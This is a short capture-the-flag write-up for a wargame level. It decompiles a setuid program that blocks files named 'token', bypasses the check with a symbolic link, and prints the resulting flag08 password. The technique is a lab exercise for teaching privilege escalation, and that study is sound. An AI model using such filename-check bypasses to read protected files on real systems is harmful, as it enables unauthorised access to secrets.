# Level 08

Here we have a level08 executable and a token file who cannot be read. 
```sh
$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

The executable refuse to read token
```sh
$ ./level08 
./level08 [file to read]
$ ./level08 token
You may not access 'token'
$ echo "testing" > /tmp/test
$ ./level08 /tmp/test
testing
```

If we decompile the executable, we understand that the executable refuse to read any file named "token":
```c
if (strstr(argv[1], "token") != 0) {
	printf("You may not access '%s'\n", argv[1]);
	exit(1);
}
```
But we cannot rename or copy it because of persmissions
```sh
$ mv token the_key
mv: cannot move `token' to `thekey': Permission denied
$ cp token /tmp/the_key
cp: cannot open `token' for reading: Permission denied
```

But a solution is to create a simple symbolic link
```sh
$ ln -s /home/user/level08/token /tmp/the_key
$ ./level08 /tmp/the_key
quif5eloekouj29ke0vouxean
```

Now can log as flag08 with `quif5eloekouj29ke0vouxean`.
